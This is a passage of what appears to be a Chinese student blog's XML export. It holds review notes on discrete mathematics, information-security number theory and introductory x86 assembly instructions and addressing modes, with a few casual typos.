punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散数学</title>
      <link href="2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
      <url>2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h1><p>小道消息，懂得都懂</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210105194524397.png" alt="image-20210105194524397" loading="lazy"></p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>交</p><p>并</p><p>补</p><p>差</p><p>环和</p><p>环积</p><h2 id="数理逻辑"><a href="#数理逻辑" class="headerlink" title="数理逻辑"></a>数理逻辑</h2><h3 id="一些没想好放哪的概念"><a href="#一些没想好放哪的概念" class="headerlink" title="一些没想好放哪的概念"></a>一些没想好放哪的概念</h3><p>重言式（永真）:对应所有指派，命题公式均为真</p><p>矛盾式（永假）:对应所有指派，命题公式均为假</p><p>偶然式:不是永真，也不是永假</p><p>辖域：紧接于量词之后的最小子公式叫量词的辖域</p><p><strong>命题：陈述句</strong>。是或真或假的断言</p><pre><code>例如：今天下雨。√      x+y&gt;4 ×明年十月一日是晴天。√无法确定真假，但也是命题</code></pre><h3 id="运算优先级及它们的真值表"><a href="#运算优先级及它们的真值表" class="headerlink" title="运算优先级及它们的真值表"></a>运算优先级及它们的真值表</h3><p>优先级：┐，∧、∨，→，&lt;-&gt;.</p><p>真值表：挺好记的，∧就是要全部是真才是真、∨有一个为真就是真，→前面真，后面假才是假，&lt;-&gt;就是双向-&gt;记得-&gt;就行了</p><table><thead><tr><th>p</th><th>q</th><th>p∧q</th><th>p∨q</th><th>p-&gt;q</th><th>p&lt;-&gt;q</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>p∧q :p并且q</p><p> p∨q:p或q</p><p> p-&gt;q :如果p，那么q</p><p> p&lt;-&gt;q:p等值于q</p><p>∀：任意</p><p>┐∀：不是所有</p><p>∃：存在</p><p>┐∃：并非存在</p><h3 id="恒等式证明"><a href="#恒等式证明" class="headerlink" title="恒等式证明"></a>恒等式证明</h3><p><strong>1.真值表法</strong>  变元比较少的情况下常用。</p><p><strong>2.等值演算法</strong>.基本恒等式和带入，替换规则。</p><p><strong>3.蕴含法</strong> P&lt;=&gt;Q的充要条件为P=&gt;Q且Q=&gt;P.</p><p><strong>逻辑恒等式、永真蕴含式(书P9 - P10)</strong></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106001807234.png" alt="image-20210106001807234" loading="lazy"></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210105230707183.png" alt="image-20210105230707183" loading="lazy"></p><p>永真蕴含式</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210105230843232.png" alt="image-20210105230843232" loading="lazy"></p><h3 id="主析取范式，主合取范式"><a href="#主析取范式，主合取范式" class="headerlink" title="主析取范式，主合取范式"></a>主析取范式，主合取范式</h3><p>将合取式称为积，将析取式称为和</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210105235325365.png" alt="image-20210105235325365" loading="lazy"></p><p>利用真值表</p><p>1代表主析取范式</p><pre><code>不带非表示1，带非表示0</code></pre><p>0代表主合取范式Π（2，4，6），M2M4M6</p><pre><code>带非表示1，不带表示0</code></pre><h3 id="推理规则"><a href="#推理规则" class="headerlink" title="推理规则"></a>推理规则</h3><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106001509361.png" alt="image-20210106001509361" loading="lazy"></p><p><strong>“A(x)对y是自由的”含义</strong></p><p><strong>US：∀xA(x) =&gt; A(x)</strong></p><p><strong>ES（ES在US之前）：∃xA(x) =&gt; A(x)</strong></p><p><strong>EG：A(y) =&gt; ∃xA(x)</strong></p><p><strong>UG：A(x) =&gt; ∀xA(x)</strong></p><h2 id="代数"><a href="#代数" class="headerlink" title="代数"></a>代数</h2><h3 id="代数运算"><a href="#代数运算" class="headerlink" title="代数运算"></a>代数运算</h3><p>封闭性：给定集合S，若对S上的元素进行 <strong><strong>* 运算，产生的象也在S中，则称集合S在 *</strong></strong> 运算下是封闭的。</p><p><strong>二元运算要满足封闭性</strong></p><p>可交换，可结合，可分配</p><p><strong>左右幺元，左右零元</strong></p><p>逆元，与逆元密切相关的一个概念，<strong>可约性</strong>，可约不一定可逆</p><pre><code>例：设 * 是集合S上的二元可结合运算，若a∈S是可逆的，则a是可约的。比如：(a ***** x=a ***** y)V(x ***** a=y ***** a)=&gt;(x=y)</code></pre><h3 id="同态与同构"><a href="#同态与同构" class="headerlink" title="同态与同构"></a>同态与同构</h3><p>同构：即存在双射</p><pre><code>两个代数同构，指它们在结构上完全一致，仅仅是元素与运算符的表示形式不同，运算性质，元素间的总体关系，即本质是一样的。</code></pre><p>同态：</p><pre><code>单（一）同态：h为单射（其余和同构相同）满同态：h为满射（其余和同构相同）自同态：A=A’（其余和同构相同）自同构：A=A’，且h是同构，则称h是自同构</code></pre><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106171152305.png" alt="image-20210106171152305" loading="lazy"></p><h3 id="半群，独异点和群"><a href="#半群，独异点和群" class="headerlink" title="半群，独异点和群"></a>半群，独异点和群</h3><p>半群：设V=&lt;S, ***** &gt;是一个代数系统， <strong><strong>* 是一个二元运算，如果 *</strong></strong> 运算是可结合的,即对于 <strong><strong>* a,b,c *</strong></strong> S,有a*(b<em>c)=(a</em>b)*c，则称V为半群。</p><pre><code>即满足**封闭性，可结合**</code></pre><p>独异点(<strong>含幺半群</strong>)：设V=&lt;S, ***** &gt;是半群，且V中有幺元，则称V是一个含幺半群，也称独异点。为强调幺元存在,有时将它写成&lt;S, ***** ,1&gt;。</p><pre><code>即满足**封闭性，可结合，有幺元**</code></pre><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106005914495.png" alt="image-20210106005914495" loading="lazy"></p><p>子半群：设V=&lt;S, ***** &gt;是半群，T <strong><strong>* S，且对于 *</strong></strong> 运算封闭，那么称&lt;T, ***** &gt;是半群&lt;S, ***** &gt;的子半群。</p><p>可交换半群(可交换独异点)：在半群(独异点)中，若运算是可交换的,则称此半群(独异点)为可交换半群(可交换独异点)。</p><p>循环独异点：设&lt;S, ***** ,e&gt;是独异点，若∃xg∈S，对∀xa ***** S,都有一个相应的h∈N使a=g^h。则称此独异点为循环独异点。并称元素g是此循环独异点的生成元。</p><p>群：设&lt;G, ***** &gt;是一个代数系统,二元运算 ***** 满足：<br>    ①满足结合律。②幺元存在。③每个元素都有逆元。<br>    则&lt;G, ***** &gt;称为群。</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106012211255.png" alt="image-20210106012211255" loading="lazy"></p><p>有限群（基数称为阶数），无限群</p><p>可交换群</p><p>元素的阶：设&lt;G, ***** &gt;是一个群，且a∈G，如果存在正整数n,使an = e,则称元素a的阶是有限的，满足a^n = e的最小正整数n称为a的<br>阶。</p><p>置换群：记号<strong>⚬</strong>表示<strong>左合成（从右到左）</strong>，例如p1⚬p2，表示先进行p2置换，再进行p1置换</p><pre><code>          记号**◇**表示**右合成（从右到左）**，例如p1◇p2，表示先进行p1置换，再进行p2置换</code></pre><p>令</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106012650403.png" alt="image-20210106012650403" loading="lazy"></p><p>则左合成</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106012719339.png" alt="image-20210106012719339" loading="lazy"></p><p>令</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106012827134.png" alt="image-20210106012827134" loading="lazy"></p><p>则右合成</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106012730680.png" alt="image-20210106012730680" loading="lazy"></p><h2 id="二元关系"><a href="#二元关系" class="headerlink" title="二元关系"></a>二元关系</h2><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>n元关系,空关系</p><p>设R是A到B的二元关系(即R∈A×B)，称A<br>为R的<strong>前域</strong>,B为R的<strong>陪域</strong>。<br>D(R)={x|∃y(&lt;x,y&gt;属于R)}叫作R的<strong>定义域</strong>(domain)。<br>R(R)={y|∃x(&lt;x,y&gt;∈R)}叫作R的<strong>值域</strong>(range)。</p><p>A上的二元关系R={&lt;x,x&gt;|任意x∈A}称为<strong>相等关系</strong>(恒等关系),记IA或EA</p><p>关系特性：</p><p><strong>自反</strong>：每个结点点都存在自回路，关系图主对角线上元素均为1</p><p><strong>反自反</strong>：每个结点点都<strong>不</strong>存在自回路，关系图主对角线上元素均为0</p><p><strong>对称</strong>：只要有a到b的弧，就有b到a的弧，关系图关于主对角线对称</p><p><strong>反对称</strong>：如果存在a到b的弧，就<strong>不</strong>存在b到a的弧</p><p><strong>传递</strong>：若有a到b和b到c，则必有a到c</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106093803548.png" alt="image-20210106093803548" loading="lazy"></p><h3 id="关系的合成运算"><a href="#关系的合成运算" class="headerlink" title="关系的合成运算"></a>关系的合成运算</h3><p>⑴关系的合成运算一般是不可交换的</p><p>(2)关系的合成运算是可结合的</p><p>(3)关系的合成运算对集合的<strong>并</strong>是可分配的</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106094038342.png" alt="image-20210106094038342" loading="lazy"></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106094051159.png" alt="image-20210106094051159" loading="lazy"></p><h3 id="关系R的幂"><a href="#关系R的幂" class="headerlink" title="关系R的幂"></a>关系R的幂</h3><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106094202358.png" alt="image-20210106094202358" loading="lazy"></p><p><strong>一个比较重要的定理</strong></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106094236333.png" alt="image-20210106094236333" loading="lazy"></p><h3 id="关系的闭包运算"><a href="#关系的闭包运算" class="headerlink" title="关系的闭包运算"></a>关系的闭包运算</h3><p>逆运算：设R是集合A到B的二元关系,关系R的逆(R的逆关系)是一个B到A上的二元关系</p><p><strong>r(R)：自反闭包；s(R)：对称闭包；t(R)：传递闭包</strong></p><p><strong>闭包就是满足自反(对称,传递)性的一个最小关系</strong></p><p>构成关系R闭包的基本方法：给R补充必要的序偶,使所得的新关系R具有自反(对称,传递)性</p><pre><code>简单来说，随便搞</code></pre><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106094929109.png" alt="image-20210106094929109" loading="lazy"></p><h3 id="次序关系"><a href="#次序关系" class="headerlink" title="次序关系"></a>次序关系</h3><p>偏序：若R具有性质：<strong>自反的，反对称的，传递的</strong>，则称R是A上的一个偏序关系，简称偏序。</p><p><strong>偏序集习惯上用哈斯(Ｈasse)图表示。</strong><br>哈斯图是一种简化的关系图：<br>①略去每个节点的自回路；②能用传递关系得出的边略去；③每条边都是向上画，并将箭头略去。(哈斯图的自反传递闭包就是关系图)</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106095321593.png" alt="image-20210106095321593" loading="lazy"></p><p>假定题目给了个A集合，B∈A，找B集合中的</p><p>最大元素：B集合中找，要和所有元素可比的最大的元素</p><p>最小元素：B集合中找，要和所有元素可比的最小的元素</p><p>极大元素：B集合中找，在最高层的，可以有多个</p><p>极小元素：B集合中找，在最低层的，可以有多个</p><p>上界：A集合找所有大于等于B集合元素的元素，要有可比性</p><p>下界：A集合找所有大于等于B集合元素的元素，要有可比性</p><p>最小上界(lub)：顾名思义</p><p>最大下界(glb)：顾名思义</p><p>拟序：若集合A上的二元关系R是<strong>反自反的,反对称的，传递的,</strong> 则称R是A上的拟序关系,简称拟序</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106100505089.png" alt="image-20210106100505089" loading="lazy"></p><p>线序：偏序关系中每两个元素都可以比较</p><p>良序：线序关系的每一非空子集都有最小元素</p><p>等价关系：如果集合A中的二元关系R是<strong>自反的，对称的，传递的，</strong>则称R是A上的一个等价关系。</p><p>模数等价（模同余）</p><p>划分：</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101232291.png" alt="image-20210106101232291" loading="lazy"></p><p>概念真头大，还是例子好理解</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101211995.png" alt="image-20210106101211995" loading="lazy"></p><h2 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h2><p>数据结构都会吧</p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101517939.png" alt="image-20210106101517939" loading="lazy"></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101642562.png" alt="image-20210106101642562" loading="lazy"></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101701331.png" alt="image-20210106101701331" loading="lazy"></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106101723027.png" alt="image-20210106101723027" loading="lazy"></p><h3 id="正则图"><a href="#正则图" class="headerlink" title="正则图"></a>正则图</h3><p>如果每个结点的度数均为k，则该图称为k-正则图</p><p><strong>10个顶点的3-正则图</strong></p><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106102030813.png" alt="image-20210106102030813" loading="lazy"></p><h3 id="概念：没错，又是我"><a href="#概念：没错，又是我" class="headerlink" title="概念：没错，又是我"></a>概念：没错，又是我</h3><p>任何图中，度数为奇数的结点必是偶数个。</p><p>子图：边点都能删</p><p>生成子图：只删边</p><p>导出子图：删点</p><p>补图：由G中所有结点和所有能使G成为完全图的添加边组成的图</p><p>图的同构：两图的结点和边分别存在着一一对应，且保持关联关系</p><pre><code>同构**必要条件(证明不是同构)**:(1) 结点数目相等；(2) 边数相等；(3) 度数相同的结点数目相等。</code></pre><p><img src="/2021/04/17/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/image-20210106102747629.png" alt="image-20210106102747629" loading="lazy"></p><h3 id="路径和回路"><a href="#路径和回路" class="headerlink" title="路径和回路"></a>路径和回路</h3><p>简单路径：边不重复的路径</p><p>基本路径：各点出现不超过一次的路径</p><p>简单回路：边不重复的回路</p><p>基本回路：各点出现不超过一次的回路</p><p>强连通，弱连通，最短路径</p><p>欧拉图：一笔画问题，平凡图是欧拉图。</p><p>哈密尔顿图：每个顶点只经过一次的回路</p><h3 id="二部图"><a href="#二部图" class="headerlink" title="二部图"></a>二部图</h3><p>Km,n：上面m个顶点下面出度为n</p><pre><code>**完全匹配，最大匹配**</code></pre><p>无向图G作为二部图的充要条件是G中所有回路长度均为偶数。</p>]]></content>
      
      
      <categories>
          
          <category> 离散数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信安数学</title>
      <link href="2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/"/>
      <url>2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信安数学基础（我大哥说有手就行）"><a href="#信安数学基础（我大哥说有手就行）" class="headerlink" title="信安数学基础（我大哥说有手就行）"></a>信安数学基础（我大哥说有手就行）</h1><p><strong>耗子尾汁</strong></p><p>完全剩余系：有n个元素</p><p>简化剩余系：最多n-1个</p><h4 id><a href="#" class="headerlink" title></a><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20201227190842638.png" alt="image-20201227190842638" loading="lazy"></h4><p>例如3的简化剩余系：2,4        或       1，5</p><p><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20201227191913038.png" alt="image-20201227191913038" loading="lazy"></p><p><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20210106131738797.png" alt="image-20210106131738797" loading="lazy"></p><p><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20210106135758273.png" alt="image-20210106135758273" loading="lazy"></p><p><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20210106135815518.png" alt="image-20210106135815518" loading="lazy"></p><p><img src="/2021/04/17/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6/image-20210106135840612.png" alt="image-20210106135840612" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 信安数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编</title>
      <link href="2021/04/17/%E6%B1%87%E7%BC%96/"/>
      <url>2021/04/17/%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>本人菜鸡</p><p>别骂了别骂了</p><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2><p><strong>汇编语言与机器语言有什么关系？</strong><br>机器语言是一种数字语言，人难以理解<br>汇编语言采用助记符描述指令，如ADD,CALL等指令，人易理解些<br>一般来说，汇编指令同机器指令有一一对应的关系</p><pre class="line-numbers language-none"><code class="language-none">int Y;Mov eax , Yint X &#x3D;  Y + 4 ;Add eax , 4Mov x  , eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-IA-32处理器体系结构"><a href="#2-IA-32处理器体系结构" class="headerlink" title="2.IA-32处理器体系结构"></a>2.IA-32处理器体系结构</h2><pre class="line-numbers language-none"><code class="language-none">Ø 了解微机的结构Ø 掌握IA32处理器的基本执行环境，掌握各寄存器的作用Ø 理解指令的运行过程Ø 掌握IA-32处理器有3种基本的操作模式，特别是保护模式与实模式（包括地址计算等）Ø 了解其它内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-汇编语言基础"><a href="#3-汇编语言基础" class="headerlink" title="3.汇编语言基础"></a>3.汇编语言基础</h2><pre class="line-numbers language-none"><code class="language-none">Ø 理解汇编语言的基本要素，能写出完整的汇编程序Ø 理解汇编程序转换为可执行程序的全过程Ø 掌握配置VC6的方法Ø 掌握汇编数据定义方法、符号常量的定义方法Ø 理解Intel处理器所使用的小端顺序，并能灵活运用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-数据传送寻址和算术运算"><a href="#4-数据传送寻址和算术运算" class="headerlink" title="4 .数据传送寻址和算术运算"></a>4 .数据传送寻址和算术运算</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">r8<span class="token number">8</span>位寄存器<span class="token punctuation">:</span>AH<span class="token punctuation">,</span>AL<span class="token punctuation">,</span>…DH<span class="token punctuation">,</span>DLr16<span class="token number">16</span>位寄存器AX<span class="token punctuation">,</span>BX<span class="token punctuation">,</span>CX<span class="token punctuation">,</span>DX<span class="token punctuation">,</span>SI<span class="token punctuation">,</span>DI<span class="token punctuation">,</span>SP<span class="token punctuation">,</span>BPr32<span class="token number">32</span>位寄存器，上列中加前缀Ereg任意通用寄存器sreg<span class="token number">16</span>位段寄存器CS<span class="token punctuation">,</span>DS<span class="token punctuation">,</span>SS<span class="token punctuation">,</span>ES<span class="token punctuation">,</span>FS<span class="token punctuation">,</span>GSimm8<span class="token number">8</span>位立即数，字节Imm16<span class="token punctuation">,</span><span class="token number">32</span><span class="token number">16</span>位立即数，字<span class="token punctuation">;</span><span class="token number">32</span>位立即数<span class="token punctuation">,</span>双字imm任意立即数r<span class="token operator">/</span>m8<span class="token number">8</span>位操作数，<span class="token number">8</span>位寄存器或者字节内存r<span class="token operator">/</span>m16<span class="token punctuation">,</span><span class="token number">32</span><span class="token number">16</span>位，<span class="token number">32</span>位寄存器或内存单元mem内存操作数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">mov把一个字节或字的操作数从源地址传送至目的地址     mov eax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>eax<span class="token operator">=</span><span class="token number">00000000</span>h    movzx零拓展，再传送<span class="token punctuation">,</span>用于无符号数    mov bx<span class="token punctuation">,</span><span class="token number">0</span>a<span class="token operator">=</span>A69Bh    movzx eax<span class="token punctuation">,</span>bx<span class="token punctuation">;</span>bx<span class="token operator">=</span><span class="token number">0000</span>A69Bh    movsz符号拓展，再传送，用于有符号数    mov ax<span class="token punctuation">,</span><span class="token number">10001111</span>b<span class="token punctuation">;</span>ax<span class="token operator">=</span><span class="token number">1111111110001111</span>b                <span class="token comment">//LAHF    标志寄存器传送,把标志装入AH.  </span><span class="token comment">//SAHF    标志寄存器传送,把AH内容装入标志寄存器.         </span>        inc加<span class="token number">1</span>dec减<span class="token number">1</span>sub减法add求和        add a<span class="token punctuation">,</span>ba<span class="token operator">=</span>a<span class="token operator">+</span>b       sub a<span class="token punctuation">,</span>ba<span class="token operator">=</span>a<span class="token operator">+</span>b        加减法会影响标志位        neg转换成补码，按位取反再<span class="token operator">+</span><span class="token number">1</span>        有符号数与无符号数溢出的判断方法有符号数最高位为符号位，<span class="token number">0</span>为正数，<span class="token number">1</span>为负数，所以一个字节八位（<span class="token number">2</span><span class="token operator">^</span><span class="token number">8</span><span class="token operator">=</span><span class="token number">256</span>），却只能表示绝对值为<span class="token number">7</span>位以内的数（<span class="token number">2</span><span class="token operator">^</span><span class="token number">7</span><span class="token operator">=</span><span class="token number">128</span>，<span class="token operator">-</span><span class="token number">128</span><span class="token operator">~</span><span class="token number">127</span>包含<span class="token number">0</span>）。有符号数溢出会先溢出到符号位，导致正数变负数的情况，符号标志位由<span class="token number">0</span>置<span class="token number">1.</span>无符号数没有符号位，溢出代表其大小无法存储数据，直接溢出标志位 置<span class="token number">1</span>                offset返回数据标号的偏移地址，以字节为单位。ptr     重写一个操作数的大小类型        num1 dword <span class="token number">12345678</span>h        mov ax<span class="token punctuation">,</span>num1 <span class="token punctuation">;</span>这个不被允许        mov ax<span class="token punctuation">,</span>word ptr num1 <span class="token punctuation">;</span>这就可以type    返回按字节计算的变量的单个元素的大小lenthof 返回操作数的元素个数       <span class="token keyword">sizeof</span>返回操作数所占的字节数个数        <span class="token comment">//align    将变量的位置按指定的大小对齐</span><span class="token comment">//label    插入一个标号，并定于大小</span>            <span class="token comment">//val1 label word</span>间接寻址            array byte <span class="token number">10</span>h<span class="token punctuation">,</span><span class="token number">20</span>h<span class="token punctuation">,</span><span class="token number">30</span>h<span class="token punctuation">;</span>            mov esi<span class="token punctuation">,</span>offset array            moval<span class="token punctuation">,</span><span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">10</span>h            inc esi            mov al<span class="token punctuation">,</span><span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">20</span>h变址寻址                        array byte <span class="token number">10</span>h<span class="token punctuation">,</span><span class="token number">20</span>h<span class="token punctuation">,</span><span class="token number">30</span>h<span class="token punctuation">;</span>            mov esi<span class="token punctuation">,</span><span class="token number">0</span>            moval<span class="token punctuation">,</span>array<span class="token punctuation">[</span>exi<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">10</span>h            mov al<span class="token punctuation">,</span>array<span class="token punctuation">[</span>esi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">20</span>h变址寻址比例因子            array word <span class="token number">10</span>h<span class="token punctuation">,</span><span class="token number">20</span>h<span class="token punctuation">,</span><span class="token number">30</span>h<span class="token punctuation">;</span>            mov esi<span class="token punctuation">,</span><span class="token number">0</span>            moval<span class="token punctuation">,</span>array<span class="token punctuation">[</span>exi<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">10</span>h            mov esi<span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">*</span>type array            mov al<span class="token punctuation">,</span>array<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">20</span>h            mov esi<span class="token punctuation">,</span><span class="token number">2</span>            mov al<span class="token punctuation">,</span>array<span class="token punctuation">[</span>esi<span class="token operator">*</span>type array<span class="token punctuation">]</span><span class="token punctuation">;</span>al<span class="token operator">=</span><span class="token number">30</span>hjmp无条件跳转                loop循环，把ECX的值<span class="token operator">-</span><span class="token number">1</span>再与<span class="token number">0</span>比较，等于<span class="token number">0</span>不跳转，不等于<span class="token number">0</span>则跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">push入栈 esp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>要压入的<span class="token number">32</span>位值压入esp指向的内存pop出栈 esp<span class="token operator">+</span><span class="token number">4</span>pushfd把<span class="token number">32</span>位的标志寄存器压栈popfd 出pushad把<span class="token number">8</span>个通用<span class="token number">32</span>位寄存器压栈popad 出过程定义exam1 <span class="token function">proc</span> <span class="token punctuation">(</span>uses eax<span class="token punctuation">,</span>ebx<span class="token punctuation">)</span>…………retexam1 endp过程调用call exam1call   调用过程把eip压栈（即当前call指令的下一条指令的地址），然后将过程名所在地址赋给eip，相当于跳转到过程名所在的代码处。ret从栈中取出<span class="token number">32</span>位值，赋给eipuses保护寄存器uses eax    相当于  push eax  pop eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-条件处理"><a href="#6-条件处理" class="headerlink" title="6.条件处理"></a>6.条件处理</h2><pre class="line-numbers language-none"><code class="language-none">and与，相当于合取把源操作数和目的操作数对各二进制位按位相与，结果存到目的操作数中or或，析取xor相同为0，不同为1not对操作数取反cmp对两个操作数作相减运算，不修改操作数，但会影响标志位,跟着条件跳转使用test将两操作数按位执行相与操作，结果不存到目的操作数，但标志寄存器中的标志位体现结果的属性。      test a,b   &#x3D;&gt; and a,b    a&amp;b&#x3D;0    